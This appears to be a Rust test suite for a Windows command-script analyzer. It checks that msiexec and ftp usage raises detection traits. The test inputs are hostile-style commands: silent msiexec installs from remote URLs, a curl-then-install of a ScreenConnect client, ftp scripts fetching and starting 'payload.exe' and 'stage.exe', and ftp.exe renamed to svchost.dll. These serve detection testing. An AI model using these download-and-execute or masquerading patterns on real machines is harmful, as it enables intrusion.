#[cfg(test)]
mod msiexec_tests {
    use crate::analyze;
    use crate::env::{Config, Environment, FsEntry};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn msiexec_url_package_argument_emits_typed_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /quiet /i "https://msiexec-direct.example/setup.msi""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { url, .. }
                    if url == "https://msiexec-direct.example/setup.msi"
            )
        });
        assert!(has, "msiexec URL argument not typed: {:?}", env.traits);
    }

    #[test]
    fn msiexec_url_package_preserves_balanced_bracket_suffix() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /quiet /i "https://msiexec-direct.example/setup[1]""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { url, .. }
                    if url == "https://msiexec-direct.example/setup[1]"
            )
        });
        assert!(
            has,
            "msiexec bracketed URL argument was truncated: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_attached_install_url_emits_typed_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /quiet /ihttps://msiexec-attached.example/setup.msi"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { url, .. }
                    if url == "https://msiexec-attached.example/setup.msi"
            )
        });
        assert!(
            has,
            "msiexec attached URL argument not typed: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_patch_url_emits_typed_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /quiet /p "https://msiexec-patch.example/update.msp""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { url, .. }
                    if url == "https://msiexec-patch.example/update.msp"
            )
        });
        assert!(
            has,
            "msiexec patch URL argument not typed: {:?}",
            env.traits
        );
        let has_lolbas = env.traits.iter().any(
            |t| matches!(t, Trait::Lolbas { name, cmd } if name == "msiexec" && cmd.contains("/p")),
        );
        assert!(
            has_lolbas,
            "msiexec patch URL not marked as LOLBAS: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_administrative_install_url_emits_typed_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /quiet /ahttps://msiexec-admin.example/setup.msi"#,
            &mut env,
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::UrlArgument { url, .. }
                        if url == "https://msiexec-admin.example/setup.msi"
                )
            }),
            "msiexec /a attached URL argument not typed: {:?}",
            env.traits
        );
        assert!(
            env.traits.iter().any(
                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "msiexec" && cmd.contains("/a"))
            ),
            "msiexec /a URL not marked as LOLBAS: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_schemeless_package_url_emits_typed_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /quiet /i msiexec-schemeless.example/setup.msi"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { url, .. }
                    if url == "http://msiexec-schemeless.example/setup.msi"
            )
        });
        assert!(
            has,
            "msiexec schemeless package URL argument not typed: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_local_package_argument_emits_lolbas_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /i "C:\Users\Public\ScreenConnect.ClientSetup.msi" /qn /norestart"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Lolbas { name, cmd }
                    if name == "msiexec" && cmd.contains("ScreenConnect.ClientSetup.msi")
            )
        });
        assert!(
            has,
            "msiexec local package did not emit LOLBAS trait: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_log_url_is_not_treated_as_package_argument() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /i local.msi /l*v https://msiexec-log-only.example/install.log"#,
            &mut env,
        );

        assert!(
            !env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::UrlArgument { url, .. }
                        if url == "https://msiexec-log-only.example/install.log"
                )
            }),
            "msiexec log URL was promoted as package source: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_local_administrative_install_emits_lolbas_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"msiexec /a "C:\Users\Public\ScreenConnect.ClientSetup.msi" /qn"#,
            &mut env,
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Lolbas { name, cmd }
                        if name == "msiexec" && cmd.contains("ScreenConnect.ClientSetup.msi")
                )
            }),
            "msiexec local /a package did not emit LOLBAS trait: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_local_package_resolves_prior_download_source() {
        let report = analyze(
            br#"curl -o ScreenConnect.ClientSetup.msi "https://msiexec-local.example/ScreenConnect.ClientSetup.msi"
msiexec /i ScreenConnect.ClientSetup.msi /qn"#,
            &Config::default(),
        );
        let has = report.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { cmd, url }
                    if cmd == "msiexec /i ScreenConnect.ClientSetup.msi /qn"
                        && url == "https://msiexec-local.example/ScreenConnect.ClientSetup.msi"
            )
        });
        assert!(
            has,
            "msiexec local package did not resolve prior download source: {:?}",
            report.traits
        );
    }

    #[test]
    fn msiexec_basename_package_resolves_full_path_download_source() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"curl -o C:\Temp\setup.msi https://msiexec-basename.example/setup.msi"#,
            &mut env,
        );
        interpret_line("msiexec /i setup.msi /qn", &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { cmd, url }
                    if cmd == "msiexec /i setup.msi /qn"
                        && url == "https://msiexec-basename.example/setup.msi"
            )
        });
        assert!(
            has,
            "msiexec basename package did not resolve full-path download source: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_slash_equivalent_package_resolves_full_path_download_source() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"curl -o C:\Temp\setup.msi https://msiexec-slash-equivalent.example/setup.msi"#,
            &mut env,
        );
        interpret_line("msiexec /i C:/Temp/setup.msi /qn", &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { cmd, url }
                    if cmd == "msiexec /i C:/Temp/setup.msi /qn"
                        && url == "https://msiexec-slash-equivalent.example/setup.msi"
            )
        });
        assert!(
            has,
            "msiexec slash-equivalent package did not resolve full-path download source: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_current_dir_package_resolves_tracked_download_source() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            "setup.msi".to_string(),
            FsEntry::Download {
                src: "https://msiexec-current-dir.example/setup.msi".to_string(),
            },
        );
        interpret_line(r"msiexec /i .\setup.msi /qn", &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::UrlArgument { cmd, url }
                    if cmd == r"msiexec /i .\setup.msi /qn"
                        && url == "https://msiexec-current-dir.example/setup.msi"
            )
        });
        assert!(
            has,
            "msiexec current-dir package did not resolve tracked download source: {:?}",
            env.traits
        );
    }

    #[test]
    fn msiexec_current_dir_nested_package_does_not_use_unrelated_basename_download() {
        let report = analyze(
            br#"curl -o D:\Other\setup.msi https://msiexec-current-dir-wrong-basename.example/setup.msi
msiexec /i .\Temp\setup.msi /qn"#,
            &Config::default(),
        );
        assert!(
            !report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::UrlArgument { cmd, url }
                        if cmd == r"msiexec /i .\Temp\setup.msi /qn"
                            && url == "https://msiexec-current-dir-wrong-basename.example/setup.msi"
                )
            }),
            "msiexec nested current-dir package reused unrelated basename download: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
mod ftp_tests {
    use crate::analyze;
    use crate::env::{Config, Environment, FsEntry};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn ftp_script_file_emits_remote_connect_and_download() {
        let report = analyze(
            br#"echo open ftp-drop.example.com>ftp.txt
echo binary>>ftp.txt
echo get payload.exe C:\Temp\payload.exe>>ftp.txt
ftp -n -s:ftp.txt"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::RemoteConnect { cmd, host, port }
                        if cmd == "ftp -n -s:ftp.txt"
                            && host == "ftp-drop.example.com"
                            && *port == 21
                )
            }),
            "ftp script remote host was not surfaced: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { cmd, src, dst }
                        if cmd == "ftp -n -s:ftp.txt"
                            && src == "ftp://ftp-drop.example.com/payload.exe"
                            && dst.as_deref() == Some(r#"C:\Temp\payload.exe"#)
                )
            }),
            "ftp script get command was not surfaced as download: {:?}",
            report.traits
        );
    }

    #[test]
    fn ftp_script_cd_and_default_get_destination_are_resolved() {
        let report = analyze(
            br#"echo open ftp-dir.example.net 2121 >f.scr
echo cd pub/tools>>f.scr
echo recv stage.bin>>f.scr
ftp.exe -s:f.scr"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::RemoteConnect { host, port, .. }
                        if host == "ftp-dir.example.net" && *port == 2121
                )
            }),
            "ftp script host:port was not surfaced: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, dst, .. }
                        if src == "ftp://ftp-dir.example.net:2121/pub/tools/stage.bin"
                            && dst.as_deref() == Some("stage.bin")
                )
            }),
            "ftp script cwd/default destination was not surfaced: {:?}",
            report.traits
        );
    }

    #[test]
    fn ftp_script_lcd_applies_to_default_get_destination() {
        let report = analyze(
            br#"echo open ftp-lcd.example.net>f.scr
echo lcd C:\Users\Public>>f.scr
echo get stage.exe>>f.scr
ftp.exe -s:f.scr
start C:\Users\Public\stage.exe"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, dst, .. }
                        if src == "ftp://ftp-lcd.example.net/stage.exe"
                            && dst.as_deref() == Some(r#"C:\Users\Public\stage.exe"#)
                )
            }),
            "ftp script lcd/default destination was not surfaced: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::UrlArgument { cmd, url }
                        if cmd == r#"start C:\Users\Public\stage.exe"#
                            && url == "ftp://ftp-lcd.example.net/stage.exe"
                )
            }),
            "later start did not resolve ftp lcd download destination: {:?}",
            report.traits
        );
    }

    #[test]
    fn ftp_script_mget_single_file_is_downloaded() {
        let report = analyze(
            br#"echo open ftp-mget.example.net>f.scr
echo cd payloads>>f.scr
echo lcd C:\Users\Public>>f.scr
echo mget stage.exe>>f.scr
ftp.exe -s:f.scr
start C:\Users\Public\stage.exe"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, dst, .. }
                        if src == "ftp://ftp-mget.example.net/payloads/stage.exe"
                            && dst.as_deref() == Some(r#"C:\Users\Public\stage.exe"#)
                )
            }),
            "ftp script mget file was not surfaced: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::UrlArgument { cmd, url }
                        if cmd == r#"start C:\Users\Public\stage.exe"#
                            && url == "ftp://ftp-mget.example.net/payloads/stage.exe"
                )
            }),
            "later start did not resolve ftp mget destination: {:?}",
            report.traits
        );
    }

    #[test]
    fn copied_ftp_alias_script_file_emits_download() {
        let report = analyze(
            br#"copy C:\Windows\System32\ftp.exe C:\Users\Public\svchost.dll
echo open ftp-copied.example.net>f.scr
echo lcd C:\Users\Public>>f.scr
echo get stage.exe>>f.scr
C:\Users\Public\svchost.dll -n -s:f.scr"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::ManipulatedExec { target, .. }
                        if target == r#"C:\Users\Public\svchost.dll"#
                )
            }),
            "copied ftp alias did not emit manipulated execution: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, dst, .. }
                        if src == "ftp://ftp-copied.example.net/stage.exe"
                            && dst.as_deref() == Some(r#"C:\Users\Public\stage.exe"#)
                )
            }),
            "copied ftp alias script download was not surfaced: {:?}",
            report.traits
        );
    }

    #[test]
    fn ftp_current_dir_script_file_emits_remote_connect_and_download() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            "ftp.txt".to_string(),
            FsEntry::Content {
                content: b"open ftp-current-dir.example.com\r\nget payload.exe out.exe\r\n"
                    .to_vec(),
                append: false,
            },
        );
        interpret_line(r"ftp -n -s:.\ftp.txt", &mut env);
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::RemoteConnect { cmd, host, port }
                        if cmd == r"ftp -n -s:.\ftp.txt"
                            && host == "ftp-current-dir.example.com"
                            && *port == 21
                )
            }),
            "current-dir ftp script remote host was not surfaced: {:?}",
            env.traits
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { cmd, src, dst }
                        if cmd == r"ftp -n -s:.\ftp.txt"
                            && src == "ftp://ftp-current-dir.example.com/payload.exe"
                            && dst.as_deref() == Some("out.exe")
                )
            }),
            "current-dir ftp script get command was not surfaced as download: {:?}",
            env.traits
        );
    }

    #[test]
    fn ftp_slash_equivalent_script_file_emits_remote_connect_and_download() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            r#"c:\temp\ftp.txt"#.to_string(),
            FsEntry::Content {
                content: b"open ftp-slash-equivalent.example.com\r\nget payload.exe out.exe\r\n"
                    .to_vec(),
                append: false,
            },
        );
        interpret_line(r"ftp -n -s:C:/Temp/ftp.txt", &mut env);
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::RemoteConnect { cmd, host, port }
                        if cmd == r"ftp -n -s:C:/Temp/ftp.txt"
                            && host == "ftp-slash-equivalent.example.com"
                            && *port == 21
                )
            }),
            "slash-equivalent ftp script remote host was not surfaced: {:?}",
            env.traits
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { cmd, src, dst }
                        if cmd == r"ftp -n -s:C:/Temp/ftp.txt"
                            && src == "ftp://ftp-slash-equivalent.example.com/payload.exe"
                            && dst.as_deref() == Some("out.exe")
                )
            }),
            "slash-equivalent ftp script get command was not surfaced as download: {:?}",
            env.traits
        );
    }

    #[test]
    fn ftp_current_dir_nested_script_does_not_use_unrelated_basename_content() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            r#"c:\other\ftp.txt"#.to_string(),
            FsEntry::Content {
                content: b"open ftp-wrong-basename.example.com\r\nget payload.exe out.exe\r\n"
                    .to_vec(),
                append: false,
            },
        );
        interpret_line(r"ftp -n -s:.\Temp\ftp.txt", &mut env);
        assert!(
            !env.traits.iter().any(|t| matches!(
                t,
                Trait::RemoteConnect { cmd, host, .. }
                    if cmd == r"ftp -n -s:.\Temp\ftp.txt"
                        && host == "ftp-wrong-basename.example.com"
            )),
            "nested current-dir ftp script reused unrelated basename content: {:?}",
            env.traits
        );
        assert!(
            !env.traits.iter().any(|t| matches!(
                t,
                Trait::Download { cmd, src, .. }
                    if cmd == r"ftp -n -s:.\Temp\ftp.txt"
                        && src == "ftp://ftp-wrong-basename.example.com/payload.exe"
            )),
            "nested current-dir ftp script emitted download from unrelated basename content: {:?}",
            env.traits
        );
    }

    #[test]
    fn ftp_script_open_without_download_emits_remote_connect() {
        let report = analyze(
            br#"echo open ftp-control.example.org>ftp-only.txt
echo user anonymous pass@example.org>>ftp-only.txt
echo dir>>ftp-only.txt
ftp -s:ftp-only.txt"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::RemoteConnect { cmd, host, port }
                        if cmd == "ftp -s:ftp-only.txt"
                            && host == "ftp-control.example.org"
                            && *port == 21
                )
            }),
            "ftp script open without download did not emit RemoteConnect: {:?}",
            report.traits
        );
    }
}

